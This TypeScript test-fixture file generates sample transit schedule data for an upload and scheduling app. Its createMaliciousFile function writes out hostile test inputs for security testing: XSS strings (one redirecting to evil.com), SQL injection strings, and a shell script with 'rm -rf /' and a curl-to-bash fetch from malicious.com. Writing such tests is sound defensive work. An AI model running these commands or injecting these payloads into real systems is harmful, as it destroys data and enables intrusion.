/**
 * Test Fixtures for Integration Tests
 * Provides realistic test data and mock objects for Schedule Command Center testing
 */

import { ParsedCsvData } from '../../utils/csvParser';
import { ParsedExcelData } from '../../utils/excelParser';
import { DetectedFormat } from '../../utils/formatDetector';
import { TimePoint, TravelTime, SummarySchedule, ServiceBand } from '../../types/schedule';
import { ValidationResult } from '../../utils/validator';
import { CalculationResults, TimeBand } from '../../utils/calculator';
import { UnifiedDraftCompat } from '../../services/draftService';

/**
 * Sample CSV data for testing upload functionality
 */
export const createSampleCsvData = (size: 'small' | 'medium' | 'large' = 'medium'): ParsedCsvData => {
  const sizes = {
    small: { timePoints: 5, segments: 4 },
    medium: { timePoints: 10, segments: 9 },
    large: { timePoints: 20, segments: 19 }
  };
  
  const { timePoints: pointCount, segments: segmentCount } = sizes[size];
  
  const timePointNames = Array.from({ length: pointCount }, (_, i) => {
    const names = [
      'Downtown Terminal', 'Main Street', 'Shopping Mall', 'University Campus', 
      'General Hospital', 'City Hall', 'Transit Center', 'Airport', 'Industrial Park', 
      'Residential Area', 'School District', 'Community Center', 'Sports Complex',
      'Business Park', 'Medical Center', 'Shopping Center', 'Tech Campus',
      'Historic District', 'Waterfront', 'Suburbs Terminal'
    ];
    return names[i] || `Stop ${i + 1}`;
  });

  // Create sample segments based on time points
  const segments = timePointNames.slice(0, -1).map((fromPoint, index) => ({
    fromLocation: fromPoint,
    toLocation: timePointNames[index + 1],
    timeSlot: '07:00 - 07:29', // Default time slot for testing
    percentile25: Math.floor(Math.random() * 5 + 3), // 3-8 min
    percentile50: Math.floor(Math.random() * 7 + 5), // 5-12 min
    percentile80: Math.floor(Math.random() * 10 + 8), // 8-18 min
    percentile90: Math.floor(Math.random() * 12 + 10), // 10-22 min
  }));

  return {
    segments,
    timePoints: timePointNames,
    validationSummary: {
      totalSegments: segmentCount,
      validSegments: segmentCount,
      invalidSegments: 0,
      timeSlots: Math.ceil(segmentCount / 2)
    }
  };
};

/**
 * Sample Excel data for testing
 */
export const createSampleExcelData = (size: 'small' | 'medium' | 'large' = 'medium'): ParsedExcelData => {
  const csvData = createSampleCsvData(size);
  
  const timePoints: TimePoint[] = csvData.timePoints.map((name, index) => ({
    id: name.toLowerCase().replace(/\s+/g, '-').replace(/[^a-z0-9-]/g, ''),
    name,
    sequence: index + 1
  }));

  const travelTimes: TravelTime[] = [];
  for (let i = 0; i < timePoints.length - 1; i++) {
    travelTimes.push({
      fromTimePoint: timePoints[i].id,
      toTimePoint: timePoints[i + 1].id,
      weekday: Math.floor(Math.random() * 10 + 5), // 5-15 min
      saturday: Math.floor(Math.random() * 12 + 6), // 6-18 min
      sunday: Math.floor(Math.random() * 15 + 7) // 7-22 min
    });
  }

  const format: DetectedFormat = {
    hasHeader: true,
    headerRow: 0,
    timePointColumns: timePoints.map((_, index) => index),
    timePointNames: timePoints.map(tp => tp.name),
    dataStartRow: 1,
    timeFormat: 'HH:MM',
    dayTypeColumns: {
      weekday: [1, 2, 3],
      saturday: [4, 5],
      sunday: [6, 7]
    },
    confidence: 0.95,
    errors: [],
    warnings: []
  };

  return {
    timePoints,
    travelTimes,
    format,
    metadata: {
      fileName: `test-${size}-schedule.xlsx`,
      totalRows: timePoints.length + 1,
      processedRows: timePoints.length,
      skippedRows: 0
    }
  };
};

/**
 * Sample validation results
 */
export const createValidationResult = (isValid: boolean = true, errorCount: number = 0): ValidationResult => {
  const errors = Array.from({ length: errorCount }, (_, i) => ({
    type: 'ERROR' as const,
    code: `E${(i + 1).toString().padStart(3, '0')}`,
    message: `Test error ${i + 1}: Sample validation error for testing`,
    details: { field: `field_${i + 1}`, line: i + 2 }
  }));

  const warnings = isValid ? [] : [
    {
      type: 'WARNING' as const,
      code: 'W001',
      message: 'Test warning: Sample validation warning for testing',
      details: { field: 'general', line: 1 }
    }
  ];

  return {
    isValid: isValid && errorCount === 0,
    errors,
    warnings,
    statistics: {
      totalTimePoints: 10,
      totalTravelTimes: 9,
      averageTravelTime: 12.5,
      minTravelTime: 5,
      maxTravelTime: 22,
      missingConnections: 0,
      duplicateConnections: 0,
      dayTypeCoverage: {
        weekday: 9,
        saturday: 9,
        sunday: 9
      }
    }
  };
};

/**
 * Sample time bands for different day types
 */
export const createSampleTimeBands = (): { weekday: TimeBand[]; saturday: TimeBand[]; sunday: TimeBand[] } => ({
  weekday: [
    { startTime: '06:00', endTime: '09:00', frequency: 15 }, // Peak morning
    { startTime: '09:00', endTime: '15:00', frequency: 30 }, // Mid-day
    { startTime: '15:00', endTime: '18:00', frequency: 12 }, // Peak afternoon
    { startTime: '18:00', endTime: '22:00', frequency: 20 }  // Evening
  ],
  saturday: [
    { startTime: '07:00', endTime: '12:00', frequency: 20 }, // Morning
    { startTime: '12:00', endTime: '20:00', frequency: 25 }, // Afternoon/Evening
    { startTime: '20:00', endTime: '23:00', frequency: 40 }  // Late evening
  ],
  sunday: [
    { startTime: '08:00', endTime: '12:00', frequency: 30 }, // Morning
    { startTime: '12:00', endTime: '18:00', frequency: 35 }, // Afternoon
    { startTime: '18:00', endTime: '21:00', frequency: 45 }  // Evening
  ]
});

/**
 * Sample service bands
 */
export const createSampleServiceBands = (): ServiceBand[] => [
  {
    name: 'Peak Express',
    color: '#4CAF50', // Green
    segmentTimes: [5, 7, 4, 8, 6, 5, 9, 7, 6, 8],
    totalMinutes: 65,
    description: 'Fastest service during peak hours'
  },
  {
    name: 'Standard',
    color: '#FF9800', // Orange
    segmentTimes: [7, 9, 6, 10, 8, 7, 11, 9, 8, 10],
    totalMinutes: 85,
    description: 'Regular service throughout the day'
  },
  {
    name: 'Local',
    color: '#F44336', // Red
    segmentTimes: [9, 11, 8, 12, 10, 9, 13, 11, 10, 12],
    totalMinutes: 105,
    description: 'All-stops service with longer travel times'
  }
];

/**
 * Sample summary schedule
 */
export const createSampleSummarySchedule = (size: 'small' | 'medium' | 'large' = 'medium'): SummarySchedule => {
  const excelData = createSampleExcelData(size);
  
  const tripCounts = {
    small: { weekday: 20, saturday: 15, sunday: 10 },
    medium: { weekday: 50, saturday: 35, sunday: 25 },
    large: { weekday: 100, saturday: 70, sunday: 50 }
  };

  const counts = tripCounts[size];

  // Generate sample trips for each day type
  const generateTrips = (count: number, dayType: 'weekday' | 'saturday' | 'sunday') => {
    return Array.from({ length: count }, (_, tripIndex) => {
      const startHour = 6 + (tripIndex / count) * 16; // Spread trips from 6 AM to 10 PM
      const startMinutes = Math.floor((startHour % 1) * 60);
      const startTime = `${Math.floor(startHour).toString().padStart(2, '0')}:${startMinutes.toString().padStart(2, '0')}`;
      
      const times = [startTime];
      let currentMinutes = Math.floor(startHour) * 60 + startMinutes;
      
      // Add times for each subsequent stop
      for (let stopIndex = 1; stopIndex < excelData.timePoints.length; stopIndex++) {
        const travelTime = excelData.travelTimes[stopIndex - 1]?.[dayType] || 5;
        currentMinutes += travelTime + 1; // Add 1 minute dwell time
        const hours = Math.floor(currentMinutes / 60);
        const mins = currentMinutes % 60;
        times.push(`${hours.toString().padStart(2, '0')}:${mins.toString().padStart(2, '0')}`);
      }
      
      return times;
    });
  };

  return {
    routeId: 'TEST-ROUTE',
    routeName: 'Test Route',
    direction: 'Inbound',
    effectiveDate: new Date(),
    timePoints: excelData.timePoints,
    weekday: generateTrips(counts.weekday, 'weekday'),
    saturday: generateTrips(counts.saturday, 'saturday'),
    sunday: generateTrips(counts.sunday, 'sunday'),
    metadata: {
      weekdayTrips: counts.weekday,
      saturdayTrips: counts.saturday,
      sundayTrips: counts.sunday,
      frequency: 30, // 30 minute frequency for testing
      operatingHours: {
        start: '06:00',
        end: '22:00'
      }
    }
  };
};

/**
 * Sample calculation results
 */
export const createSampleCalculationResults = (summarySchedule: SummarySchedule): CalculationResults => ({
  weekday: Array.from({ length: Math.min(summarySchedule.weekday.length, 10) }, (_, i) => ({
    tripId: `WD${i + 1}`,
    scheduleEntries: summarySchedule.timePoints.map((tp, tpIndex) => ({
      timePointId: tp.id,
      arrivalTime: summarySchedule.weekday[i] ? summarySchedule.weekday[i][tpIndex] : '06:00',
      departureTime: summarySchedule.weekday[i] ? summarySchedule.weekday[i][tpIndex] : '06:00'
    })),
    totalTravelTime: summarySchedule.timePoints.length * 7, // Approximate
    isValid: true,
    errors: []
  })),
  saturday: Array.from({ length: Math.min(summarySchedule.saturday.length, 8) }, (_, i) => ({
    tripId: `SA${i + 1}`,
    scheduleEntries: summarySchedule.timePoints.map((tp, tpIndex) => ({
      timePointId: tp.id,
      arrivalTime: summarySchedule.saturday[i] ? summarySchedule.saturday[i][tpIndex] : '07:00',
      departureTime: summarySchedule.saturday[i] ? summarySchedule.saturday[i][tpIndex] : '07:00'
    })),
    totalTravelTime: summarySchedule.timePoints.length * 8,
    isValid: true,
    errors: []
  })),
  sunday: Array.from({ length: Math.min(summarySchedule.sunday.length, 6) }, (_, i) => ({
    tripId: `SU${i + 1}`,
    scheduleEntries: summarySchedule.timePoints.map((tp, tpIndex) => ({
      timePointId: tp.id,
      arrivalTime: summarySchedule.sunday[i] ? summarySchedule.sunday[i][tpIndex] : '08:00',
      departureTime: summarySchedule.sunday[i] ? summarySchedule.sunday[i][tpIndex] : '08:00'
    })),
    totalTravelTime: summarySchedule.timePoints.length * 9,
    isValid: true,
    errors: []
  })),
  metadata: {
    totalTimePoints: summarySchedule.timePoints.length,
    totalTrips: summarySchedule.metadata.weekdayTrips + summarySchedule.metadata.saturdayTrips + summarySchedule.metadata.sundayTrips,
    calculationTime: Math.random() * 1000 + 100 // 100-1100ms
  }
});

/**
 * Sample draft data
 */
export const createSampleDraft = (type: 'upload' | 'timepoints' | 'blocks' | 'complete' = 'upload'): UnifiedDraftCompat => {
  const baseData = createSampleExcelData();
  const summarySchedule = createSampleSummarySchedule();
  
  const steps = {
    upload: { currentStep: 'upload' as const, progress: 25 },
    timepoints: { currentStep: 'timepoints' as const, progress: 50 },
    blocks: { currentStep: 'blocks' as const, progress: 75 },
    complete: { currentStep: 'ready-to-publish' as const, progress: 100 }
  };

  const step = steps[type];

  const now = new Date().toISOString();
  
  return {
    draftId: `draft_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
    draftName: `Test Schedule ${type}`,
    currentStep: step.currentStep,
    progress: step.progress,
    originalData: {
      fileName: `test-schedule-${type}.csv`,
      fileType: 'excel' as const,
      uploadedData: baseData,
      uploadTimestamp: now
    },
    stepData: {
      timepoints: type === 'timepoints' || type === 'blocks' || type === 'complete' ? {
        serviceBands: createSampleServiceBands(),
        travelTimeData: [],
        outliers: []
      } : undefined,
      blockConfiguration: type === 'blocks' || type === 'complete' ? {
        numberOfBuses: 5,
        cycleTimeMinutes: 60,
        automateBlockStartTimes: true,
        blockConfigurations: []
      } : undefined,
      summarySchedule: type === 'complete' ? summarySchedule : undefined
    },
    ui: {
      celebrationsShown: [],
      lastViewedStep: type
    },
    metadata: {
      createdAt: now,
      lastModifiedAt: now,
      lastModifiedStep: type,
      version: 1,
      isPublished: false,
      publishedAt: type === 'complete' ? now : undefined,
      publishedScheduleId: type === 'complete' ? 'published_schedule_123' : undefined
    }
  };
};

/**
 * Sample file objects for upload testing
 */
export const createSampleFile = (
  name: string = 'test-schedule.csv',
  type: string = 'text/csv',
  size: number = 1024 * 50, // 50KB default
  content?: string
): File => {
  const defaultContent = `Time Point,Travel Time
Downtown Terminal,0
Main Street,8
Shopping Mall,6
University Campus,12
General Hospital,7`;

  const fileContent = content || defaultContent;
  const blob = new Blob([fileContent], { type });
  
  // Create file with specific size if needed
  if (size > fileContent.length) {
    const padding = 'x'.repeat(size - fileContent.length);
    const paddedBlob = new Blob([fileContent, padding], { type });
    return new File([paddedBlob], name, { type });
  }
  
  return new File([blob], name, { type });
};

/**
 * Sample malicious files for security testing
 */
export const createMaliciousFile = (type: 'xss' | 'sql' | 'script' | 'oversized'): File => {
  const maliciousContent = {
    xss: `Time Point,Travel Time
<script>alert('XSS')</script>,0
<img src=x onerror=alert('XSS')>,5
"><script>document.location='http://evil.com'</script>,8`,
    
    sql: `Time Point,Travel Time
'; DROP TABLE schedules; --,0
' OR '1'='1,5
admin'/**/UNION/**/SELECT/**/password/**/FROM/**/users--,8`,
    
    script: `#!/bin/bash
rm -rf /
curl http://malicious.com/payload | bash`,
    
    oversized: 'x'.repeat(1024 * 1024 * 10) // 10MB of x's
  };

  const extensions = {
    xss: '.csv',
    sql: '.csv', 
    script: '.sh',
    oversized: '.csv'
  };

  const mimeTypes = {
    xss: 'text/csv',
    sql: 'text/csv',
    script: 'application/x-sh',
    oversized: 'text/csv'
  };

  return createSampleFile(
    `malicious_${type}${extensions[type]}`,
    mimeTypes[type],
    maliciousContent[type].length,
    maliciousContent[type]
  );
};

/**
 * Performance test data generators
 */
export const createPerformanceTestData = (scale: 'small' | 'medium' | 'large' | 'xlarge' = 'medium') => {
  const scales = {
    small: { stops: 10, trips: 50, blocks: 5 },
    medium: { stops: 25, trips: 200, blocks: 15 },
    large: { stops: 50, trips: 500, blocks: 30 },
    xlarge: { stops: 100, trips: 1000, blocks: 50 }
  };

  const config = scales[scale];
  
  return {
    csvData: createSampleCsvData(scale === 'small' || scale === 'medium' ? scale : 'large'),
    excelData: createSampleExcelData(scale === 'small' || scale === 'medium' ? scale : 'large'),
    summarySchedule: createSampleSummarySchedule(scale === 'small' || scale === 'medium' ? scale : 'large'),
    timeBands: createSampleTimeBands(),
    serviceBands: createSampleServiceBands(),
    expectedMetrics: {
      timePoints: config.stops,
      totalTrips: config.trips,
      blockCount: config.blocks,
      processingTimeThreshold: scale === 'xlarge' ? 5000 : 2000, // ms
      memoryThreshold: scale === 'xlarge' ? 100 : 50 // MB
    }
  };
};

/**
 * Error scenarios for testing
 */
export const createErrorScenarios = () => ({
  networkTimeout: {
    error: new Error('Network timeout after 30 seconds'),
    retryable: true,
    expectedRecovery: 'automatic'
  },
  
  invalidData: {
    error: new Error('Invalid CSV format: Missing required headers'),
    retryable: false,
    expectedRecovery: 'manual'
  },
  
  memoryLimit: {
    error: new Error('Processing cancelled: Memory limit exceeded'),
    retryable: true,
    expectedRecovery: 'reduce_dataset'
  },
  
  authExpired: {
    error: new Error('Authentication expired'),
    retryable: true,
    expectedRecovery: 'reauth'
  },
  
  serverError: {
    error: new Error('Internal server error (500)'),
    retryable: true,
    expectedRecovery: 'retry_with_backoff'
  }
});

/**
 * Browser compatibility test configurations
 */
export const createBrowserTestConfigs = () => ({
  chrome: {
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    features: { fetch: true, promises: true, arrow: true, modules: true },
    viewport: { width: 1920, height: 1080 }
  },
  
  firefox: {
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    features: { fetch: true, promises: true, arrow: true, modules: true },
    viewport: { width: 1920, height: 1080 }
  },
  
  safari: {
    userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    features: { fetch: true, promises: true, arrow: true, modules: false },
    viewport: { width: 1440, height: 900 }
  },
  
  edge: {
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    features: { fetch: true, promises: true, arrow: true, modules: true },
    viewport: { width: 1920, height: 1080 }
  },
  
  mobile: {
    userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    features: { fetch: true, promises: true, arrow: true, modules: false },
    viewport: { width: 375, height: 667 }
  }
});

/**
 * Test event templates
 */
export const createTestEvents = () => ({
  uploadComplete: {
    type: 'schedule-data' as const,
    source: 'upload-panel',
    priority: 1,
    payload: {
      dataType: 'uploaded-schedule',
      action: 'upload-complete',
      data: {
        draftId: 'test-draft-123',
        fileName: 'test-schedule.csv',
        fileType: 'csv',
        validationResults: createValidationResult(true),
        fromUpload: true
      }
    }
  },
  
  workflowProgress: {
    type: 'workflow-progress' as const,
    source: 'workspace',
    priority: 1,
    payload: {
      currentStep: 'timepoints' as const,
      progress: 50,
      canProceed: true,
      stepData: { draftId: 'test-draft-123' }
    }
  },
  
  userInteraction: {
    type: 'user-interaction' as const,
    source: 'upload-panel',
    priority: 1,
    payload: {
      action: 'file-uploaded',
      element: 'file-input',
      elementType: 'input',
      metadata: { fileName: 'test-schedule.csv', fileSize: 51200 }
    }
  },
  
  dataValidation: {
    type: 'data-validation' as const,
    source: 'validator',
    priority: 1,
    payload: {
      validationId: 'val-123',
      status: 'valid',
      errors: [],
      warnings: []
    }
  },
  
  errorHandling: {
    type: 'error-handling' as const,
    source: 'upload-panel',
    priority: 2,
    payload: {
      errorId: 'err-123',
      errorType: 'network',
      message: 'Connection timeout',
      recoverable: true,
      context: { operation: 'file-upload', retry: 1 }
    }
  }
});